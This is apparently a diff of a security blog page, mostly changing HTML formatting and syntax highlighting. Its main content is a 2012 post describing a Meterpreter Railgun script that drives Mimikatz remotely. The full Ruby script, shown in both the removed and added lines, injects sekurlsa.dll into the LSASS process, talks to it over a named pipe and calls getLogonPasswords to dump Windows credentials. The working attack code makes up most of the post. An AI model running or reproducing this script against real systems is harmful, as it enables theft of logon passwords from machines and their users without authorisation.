@@ -7,7 +7,7 @@
 <meta name="author"
     content="mubix">
 <meta name="description"
-    content="One of the powers of Metasploit is it&amp;rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.
+    content="One of the powers of Metasploit is it&#39;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.
 Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
@@ -28,7 +28,7 @@ Here is my first step to that end; a railgun based Meterpreter script. Now befor
     type="text/css">
 
 
-<link rel="stylesheet" href="https://malicious.link/scss/main.min.099699ab246bf26f50616f7c9f00c79d46110459d1bd727b2d07d6fc09ece082.css">
+<link rel="stylesheet" href="https://malicious.link/scss/main.min.48be1f41dc1d94d27b5663b2b359c895efd7696597f656e57d8f6c0e126c0563.css">
 
 
 
@@ -39,20 +39,17 @@ Here is my first step to that end; a railgun based Meterpreter script. Now befor
 <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
 <link rel="shortcut icon" href="/favicon.ico">
 <meta name="theme-color" content="#252627"><meta itemprop="name" content="Integration of Mimikatz into Metasploit Stage1">
-<meta itemprop="description" content="One of the powers of Metasploit is it&rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.
+<meta itemprop="description" content="One of the powers of Metasploit is it&#39;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.
 Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked.">
-
-
 <meta itemprop="datePublished" content="2012-06-15T14:55:55&#43;00:00" />
 <meta itemprop="dateModified" content="2012-06-15T14:55:55&#43;00:00" />
 <meta itemprop="wordCount" content="550">
 
 
 
-<meta itemprop="keywords" content="" />
-<meta name="twitter:card" content="summary"/>
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Integration of Mimikatz into Metasploit Stage1"/>
-<meta name="twitter:description" content="One of the powers of Metasploit is it&rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.
+<meta name="twitter:description" content="One of the powers of Metasploit is it&#39;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.
 Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked."/>
 
 
@@ -128,88 +125,76 @@ Here is my first step to that end; a railgun based Meterpreter script. Now befor
             
 
             <div class="post-content">
-                <p>One of the powers of Metasploit is it&rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.</p>
-
-<p>Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked. Thankfully <a href="https://twitter.com/gentilkiwi">@gentilkiwi</a> stepped in and stopped my head from getting bloody. In this first step we will be removing the need for the mimikatz.exe binary, still needing the DLL to be uploaded, but we&rsquo;ll get there in the subsequent posts.</p>
-
+                <p>One of the powers of Metasploit is it's ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.</p>
+<p>Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked. Thankfully <a href="https://twitter.com/gentilkiwi">@gentilkiwi</a> stepped in and stopped my head from getting bloody. In this first step we will be removing the need for the mimikatz.exe binary, still needing the DLL to be uploaded, but we'll get there in the subsequent posts.</p>
 <p>Ignore the do_cmd for now and I stepped through <a href="/blog/2011/5/30/remote-dll-injection-with-meterpreter.html">remote DLL injection here</a>. So the first odd lines is </p>
-
-<pre><code class="language-ruby">handle = client.railgun.kernel32.CreateNamedPipeW('\\\\.\\pipe\\kiwi\\mimikatz', 'PIPE_ACCESS_DUPLEX', 'PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT', 1, 0, 0, 30000,nil)['return']
-connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)
-</code></pre>
-
-<p>Essentially these connect to the <a href="http://en.wikipedia.org/wiki/Named_pipe">Named Pipe</a> that the sekurlsa.dll uses to talk to the mimikatz.exe in it&rsquo;s normal operation. Then we just use the windows API call &ldquo;ReadFile&rdquo; from there on out.</p>
-
-<pre><code class="language-ruby">client.railgun.kernel32.ReadFile(handle,248,248,4,nil)
-</code></pre>
-
-<p>One of the draw backs to doing this all remotely is that Railgun doesn&rsquo;t have the memory management insight like the Windows OS does. Being able to know when pipes are ready to be read or written to is  a bit of a challenge and the call hangs your IRB / meterpreter session if you get it wrong. I&rsquo;ve overcome this for the initial &ldquo;banner&rdquo; that sekurlsa writes by knowing the exact length (248 bytes in this case) of the text. For subsequent commands like &ldquo;ping&rdquo; and &ldquo;getLogonPasswords&rdquo; I simply have to read one character at a time, which is a slow process but removes any chance of getting hung. (Two bytes for every Unicode character)</p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">handle <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>CreateNamedPipeW(<span style="color:#e6db74">&#39;\\\\.\\pipe\\kiwi\\mimikatz&#39;</span>, <span style="color:#e6db74">&#39;PIPE_ACCESS_DUPLEX&#39;</span>, <span style="color:#e6db74">&#39;PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT&#39;</span>, <span style="color:#ae81ff">1</span><span style="color:#f92672"></span>, <span style="color:#ae81ff">0</span><span style="color:#f92672"></span>, <span style="color:#ae81ff">0</span><span style="color:#f92672"></span>, <span style="color:#ae81ff">30000</span><span style="color:#f92672"></span>,<span style="color:#66d9ef">nil</span>)<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;return&#39;</span><span style="color:#f92672">]</span>
+connectedlsass <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>ConnectNamedPipe(handle,<span style="color:#66d9ef">nil</span>)
+</code></pre></div><p>Essentially these connect to the <a href="http://en.wikipedia.org/wiki/Named_pipe">Named Pipe</a> that the sekurlsa.dll uses to talk to the mimikatz.exe in it's normal operation. Then we just use the windows API call &ldquo;ReadFile&rdquo; from there on out.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>ReadFile(handle,<span style="color:#ae81ff">248</span><span style="color:#f92672"></span>,<span style="color:#ae81ff">248</span><span style="color:#f92672"></span>,<span style="color:#ae81ff">4</span><span style="color:#f92672"></span>,<span style="color:#66d9ef">nil</span>)
+</code></pre></div><p>One of the draw backs to doing this all remotely is that Railgun doesn't have the memory management insight like the Windows OS does. Being able to know when pipes are ready to be read or written to is  a bit of a challenge and the call hangs your IRB / meterpreter session if you get it wrong. I've overcome this for the initial &ldquo;banner&rdquo; that sekurlsa writes by knowing the exact length (248 bytes in this case) of the text. For subsequent commands like &ldquo;ping&rdquo; and &ldquo;getLogonPasswords&rdquo; I simply have to read one character at a time, which is a slow process but removes any chance of getting hung. (Two bytes for every Unicode character)</p>
 <p>If you have any questions on how/why this works or have a better way please leave your comments and questions below or hit me up on twitter!</p>
-
 <p>Meterpreter Script:</p>
-
-<pre><code class="language-ruby">def do_cmd(handle,cmd)
-	ucommand = Rex::Text.to_unicode(cmd)
-	sendcmd = client.railgun.kernel32.WriteFile(handle,ucommand,ucommand.size,4,nil)
-	good2go = false
-	newline = false
-	readstring = []
-	while good2go == false
-		# Have to pull data 1 unicode character at a time
-		# this is because the pipe won't write or read if
-		# too much was written or read by the &quot;client&quot; (us)
-		pull = client.railgun.kernel32.ReadFile(handle,2,2,4,nil)
-		# Check to see if our end of read check is there: n000 @00
-		if pull['lpBuffer'] == &quot;@00&quot; and newline == true
-			good2go = true
-		else
-			readstring &lt;&lt; pull['lpBuffer']
-		end
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e"></span><span style="color:#f92672"></span><span style="color:#a6e22e">do_cmd</span>(handle,cmd)
+	ucommand <span style="color:#f92672">=</span> <span style="color:#66d9ef">Rex</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Text</span><span style="color:#f92672">.</span>to_unicode(cmd)
+	sendcmd <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>WriteFile(handle,ucommand,ucommand<span style="color:#f92672">.</span>size,<span style="color:#ae81ff">4</span><span style="color:#f92672"></span>,<span style="color:#66d9ef">nil</span>)
+	good2go <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>
+	newline <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>
+	readstring <span style="color:#f92672">=</span> <span style="color:#f92672">[</span><span style="color:#f92672">]</span>
+	<span style="color:#66d9ef">while</span> good2go <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span>
+		<span style="color:#75715e"># Have to pull data 1 unicode character at a time</span>
+		<span style="color:#75715e"># this is because the pipe won&#39;t write or read if</span>
+		<span style="color:#75715e"># too much was written or read by the &#34;client&#34; (us)</span>
+		pull <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>ReadFile(handle,<span style="color:#ae81ff">2</span><span style="color:#f92672"></span>,<span style="color:#ae81ff">2</span><span style="color:#f92672"></span>,<span style="color:#ae81ff">4</span><span style="color:#f92672"></span>,<span style="color:#66d9ef">nil</span>)
+		<span style="color:#75715e"># Check to see if our end of read check is there: n000 @00</span>
+		<span style="color:#66d9ef">if</span> pull<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;lpBuffer&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">@00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">and</span> newline <span style="color:#f92672">==</span> <span style="color:#66d9ef">true</span>
+			good2go <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>
+		<span style="color:#66d9ef">else</span>
+			readstring <span style="color:#f92672">&lt;&lt;</span> pull<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;lpBuffer&#39;</span><span style="color:#f92672">]</span>
+		<span style="color:#66d9ef">end</span>
 		
-		# Ready the newline var for previous check on next loop
-		if pull['lpBuffer'] == &quot;n00&quot;
-			newline = true
-		else
-			newline = false
-		end
-	end
+		<span style="color:#75715e"># Ready the newline var for previous check on next loop</span>
+		<span style="color:#66d9ef">if</span> pull<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;lpBuffer&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">n00</span><span style="color:#e6db74">&#34;</span>
+			newline <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>
+		<span style="color:#66d9ef">else</span>
+			newline <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>
+		<span style="color:#66d9ef">end</span>
+	<span style="color:#66d9ef">end</span>
 	
-	print_status(readstring.join(&quot;&quot;))
-end
+	print_status(readstring<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>))
+<span style="color:#66d9ef">end</span>
 
-print_status(&quot;x86 Detected - Using x86 mimikatz&quot;)
-handle = client.railgun.kernel32.CreateNamedPipeW('\\\\.\\pipe\\kiwi\\mimikatz', 'PIPE_ACCESS_DUPLEX', 'PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT', 1, 0, 0, 30000,nil)['return']
-print_status(&quot;Handle: #{handle}&quot;)
-framework.threads.spawn('injectlsass',false) {
-	pid = client.sys.process['lsass.exe']
-	print_status(&quot;LSASS located at PID: #{pid}&quot;)
-	pathtomimi = &quot;C:\\sekurlsa.dll&quot;
+print_status(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">x86 Detected - Using x86 mimikatz</span><span style="color:#e6db74">&#34;</span>)
+handle <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>CreateNamedPipeW(<span style="color:#e6db74">&#39;\\\\.\\pipe\\kiwi\\mimikatz&#39;</span>, <span style="color:#e6db74">&#39;PIPE_ACCESS_DUPLEX&#39;</span>, <span style="color:#e6db74">&#39;PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT&#39;</span>, <span style="color:#ae81ff">1</span><span style="color:#f92672"></span>, <span style="color:#ae81ff">0</span><span style="color:#f92672"></span>, <span style="color:#ae81ff">0</span><span style="color:#f92672"></span>, <span style="color:#ae81ff">30000</span><span style="color:#f92672"></span>,<span style="color:#66d9ef">nil</span>)<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;return&#39;</span><span style="color:#f92672">]</span>
+print_status(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Handle: </span><span style="color:#e6db74">#{</span>handle<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+framework<span style="color:#f92672">.</span>threads<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#39;injectlsass&#39;</span>,<span style="color:#66d9ef">false</span>) {
+	pid <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>sys<span style="color:#f92672">.</span>process<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;lsass.exe&#39;</span><span style="color:#f92672">]</span>
+	print_status(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">LSASS located at PID: </span><span style="color:#e6db74">#{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+	pathtomimi <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">sekurlsa.dll</span><span style="color:#e6db74">&#34;</span>
 
-	pay = client.framework.payloads.create(&quot;windows/loadlibrary&quot;)
-	pay.datastore[&quot;DLL&quot;] = pathtomimi
-	pay.datastore[&quot;EXITFUNC&quot;] = 'thread'
+	pay <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>framework<span style="color:#f92672">.</span>payloads<span style="color:#f92672">.</span>create(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">windows/loadlibrary</span><span style="color:#e6db74">&#34;</span>)
+	pay<span style="color:#f92672">.</span>datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">DLL</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> pathtomimi
+	pay<span style="color:#f92672">.</span>datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">EXITFUNC</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;thread&#39;</span>
 
-	raw = pay.generate
-	targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
-	mem = targetprocess.memory.allocate(raw.length + (30024))
-	targetprocess.memory.write(mem, raw)
-	sleep(2)
-	targetprocess.thread.create(mem, 0)
-	print_status(&quot;Successfully Injected into LSASS&quot;)
+	raw <span style="color:#f92672">=</span> pay<span style="color:#f92672">.</span>generate
+	targetprocess <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>sys<span style="color:#f92672">.</span>process<span style="color:#f92672">.</span>open(pid, <span style="color:#66d9ef">PROCESS_ALL_ACCESS</span>)
+	mem <span style="color:#f92672">=</span> targetprocess<span style="color:#f92672">.</span>memory<span style="color:#f92672">.</span>allocate(raw<span style="color:#f92672">.</span>length <span style="color:#f92672">+</span> (<span style="color:#ae81ff">30024</span><span style="color:#f92672"></span>))
+	targetprocess<span style="color:#f92672">.</span>memory<span style="color:#f92672">.</span>write(mem, raw)
+	sleep(<span style="color:#ae81ff">2</span><span style="color:#f92672"></span>)
+	targetprocess<span style="color:#f92672">.</span>thread<span style="color:#f92672">.</span>create(mem, <span style="color:#ae81ff">0</span><span style="color:#f92672"></span>)
+	print_status(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Successfully Injected into LSASS</span><span style="color:#e6db74">&#34;</span>)
 }
-print_status(&quot;Waiting for LSASS injection to complete&quot;)
-connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)
-print_status(&quot;Mimikatz has called home, ready for command&quot;)
-sleep(2)
-print_status(&quot;Reading banner&quot;)
-client.railgun.kernel32.ReadFile(handle,248,248,4,nil)
-print_status(&quot;Doing a quick ping to make sure things are working...&quot;)
-do_cmd(handle,'ping')
-print_status(&quot;If you made it this far it worked, doing getLogonPasswords&quot;)
-do_cmd(handle, 'getLogonPasswords')
-</code></pre>
-
+print_status(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Waiting for LSASS injection to complete</span><span style="color:#e6db74">&#34;</span>)
+connectedlsass <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>ConnectNamedPipe(handle,<span style="color:#66d9ef">nil</span>)
+print_status(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Mimikatz has called home, ready for command</span><span style="color:#e6db74">&#34;</span>)
+sleep(<span style="color:#ae81ff">2</span><span style="color:#f92672"></span>)
+print_status(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Reading banner</span><span style="color:#e6db74">&#34;</span>)
+client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>ReadFile(handle,<span style="color:#ae81ff">248</span><span style="color:#f92672"></span>,<span style="color:#ae81ff">248</span><span style="color:#f92672"></span>,<span style="color:#ae81ff">4</span><span style="color:#f92672"></span>,<span style="color:#66d9ef">nil</span>)
+print_status(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Doing a quick ping to make sure things are working...</span><span style="color:#e6db74">&#34;</span>)
+do_cmd(handle,<span style="color:#e6db74">&#39;ping&#39;</span>)
+print_status(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">If you made it this far it worked, doing getLogonPasswords</span><span style="color:#e6db74">&#34;</span>)
+do_cmd(handle, <span style="color:#e6db74">&#39;getLogonPasswords&#39;</span>)
+</code></pre></div>
             </div>
         </article>
 
@@ -230,7 +215,7 @@ do_cmd(handle, 'getLogonPasswords')
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2019</span>
+            <span>&copy; 2020</span>
             
             <span></span>
             <span> <a href="https://malicious.link/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
